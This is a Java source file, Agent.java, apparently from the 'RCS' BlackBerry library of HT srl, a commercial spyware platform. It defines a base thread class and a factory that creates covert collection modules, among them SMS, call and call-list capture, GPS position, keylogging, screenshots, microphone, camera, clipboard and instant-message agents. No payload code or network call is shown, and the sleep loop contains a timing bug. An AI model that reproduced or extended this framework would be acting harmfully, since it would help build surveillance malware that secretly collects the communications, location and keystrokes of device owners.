/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Agent.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.Common;
import com.ht.rcs.blackberry.Status;
import com.ht.rcs.blackberry.log.Log;
import com.ht.rcs.blackberry.log.LogCollector;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;

public abstract class Agent extends Thread {
    private static Debug debug = new Debug("Agent", DebugLevel.VERBOSE);

    public static final int AGENT = 0x1000;
    public static final int AGENT_SMS = AGENT + 0x1;
    public static final int AGENT_TASK = AGENT + 0x2;
    public static final int AGENT_CALLLIST = AGENT + 0x3;
    public static final int AGENT_DEVICE = AGENT + 0x4;
    public static final int AGENT_POSITION = AGENT + 0x5;
    public static final int AGENT_CALL = AGENT + 0x6;
    public static final int AGENT_CALL_LOCAL = AGENT + 0x7;
    public static final int AGENT_KEYLOG = AGENT + 0x8;
    public static final int AGENT_SNAPSHOT = AGENT + 0x9;
    public static final int AGENT_URL = AGENT + 0xa;
    public static final int AGENT_IM = AGENT + 0xb;
    // public static final int AGENT_EMAIL = AGENT + 0xc;
    public static final int AGENT_MIC = AGENT + 0xd;
    public static final int AGENT_CAM = AGENT + 0xe;
    public static final int AGENT_CLIPBOARD = AGENT + 0xf;
    public static final int AGENT_CRISIS = AGENT + 0x10;
    public static final int AGENT_APPLICATION = AGENT + 0x11;
    public static final int AGENT_PDA = 0xDF7A;

    Status status;
    LogCollector logCollector;

    boolean logOnSD;

    public int AgentId;
    public int AgentStatus;

    public int Command;

    protected Log log;

    public static Agent Factory(int AgentId, int AgentStatus, byte[] confParams) {
        switch (AgentId) {
            case AGENT_SMS:
                debug.trace("Factory AGENT_SMS");
                return new SmsAgent(AgentStatus, confParams);
            case AGENT_TASK:
                debug.trace("Factory AGENT_TASK");
                return new TaskAgent(AgentStatus, confParams);
            case AGENT_CALLLIST:
                debug.trace("Factory AGENT_DEVICE");
                return new CallListAgent(AgentStatus, confParams);
            case AGENT_DEVICE:
                debug.trace("Factory AGENT_DEVICE");
                return new DeviceInfoAgent(AgentStatus, confParams);
            case AGENT_POSITION:
                debug.trace("Factory AGENT_POSITION");
                return new PositionAgent(AgentStatus, confParams);
            case AGENT_CALL:
                debug.trace("Factory AGENT_CALL");
                return new CallAgent(AgentStatus, confParams);
            case AGENT_CALL_LOCAL:
                debug.trace("Factory AGENT_CALL_LOCAL");
                return new CallLocalAgent(AgentStatus, confParams);
            case AGENT_KEYLOG:
                debug.trace("Factory AGENT_KEYLOG");
                return new KeyLogAgent(AgentStatus, confParams);
            case AGENT_SNAPSHOT:
                debug.trace("Factory AGENT_SNAPSHOT");
                return new SnapShotAgent(AgentStatus, confParams);
            case AGENT_URL:
                debug.trace("Factory AGENT_URL");
                return new UrlAgent(AgentStatus, confParams);
            case AGENT_IM:
                debug.trace("Factory AGENT_IM");
                return new ImAgent(AgentStatus, confParams);
            case AGENT_MIC:
                debug.trace("Factory AGENT_MIC");
                return new MicAgent(AgentStatus, confParams);
            case AGENT_CAM:
                debug.trace("Factory AGENT_CAM");
                return new CamAgent(AgentStatus, confParams);
            case AGENT_CLIPBOARD:
                debug.trace("Factory AGENT_CLIPBOARD");
                return new ClipBoardAgent(AgentStatus, confParams);
            case AGENT_CRISIS:
                debug.trace("Factory AGENT_CRISIS");
                return new CrisisAgent(AgentStatus, confParams);
            case AGENT_APPLICATION:
                debug.trace("Factory AGENT_APPLICATION");
                return new ApplicationAgent(AgentStatus, confParams);
            case AGENT_PDA:
                debug.trace("Factory AGENT_PDA");
                return new PdaAgent(AgentStatus, confParams);

            default:
                debug.trace("AgentId UNKNOWN: " + AgentId);
                return null;
        }
    }

    public boolean onSD() {
        return logOnSD;
    }

    protected Agent(int AgentId, int AgentStatus, boolean logOnSD) {
        status = Status.getInstance();
        logCollector = LogCollector.getInstance();

        this.AgentId = AgentId;
        this.AgentStatus = AgentStatus;

        this.logOnSD = logOnSD;
        this.log = logCollector.LogFactory(this, logOnSD);
    }

    protected abstract boolean Parse(byte[] confParameters);

    protected boolean AgentSleep(int millisec) {
        int loops = 0;
        int sleepTime = 1000;

        if (millisec < sleepTime) {
            Utils.Sleep(millisec);

            if (Command == Common.AGENT_STOP) {
                return true;
            }

            return false;
        } else {
            loops = millisec / sleepTime;
        }

        while (loops > 0) {
            Utils.Sleep(millisec);
            loops--;

            if (Command == Common.AGENT_STOP) {
                return true;
            }
        }

        return false;
    }

    protected boolean SleepUntilStopped() {
        for (;;) {
            if (AgentSleep(10 * 1000)) {
                status.ThreadAgentStopped(AgentId);
                debug.trace("Agent.java - CleanStop " + AgentId);
                return true;
            }
        }
    }

    public void run() {
        if (log == null) {
            debug.fatal("log null");
            return;
        }

        status.AgentAlive(AgentId);
        AgentRun();
        status.ThreadAgentStopped(AgentId);
    }

    public abstract void AgentRun();

    public String toString() {
        return "Agent " + AgentId;
    }
}
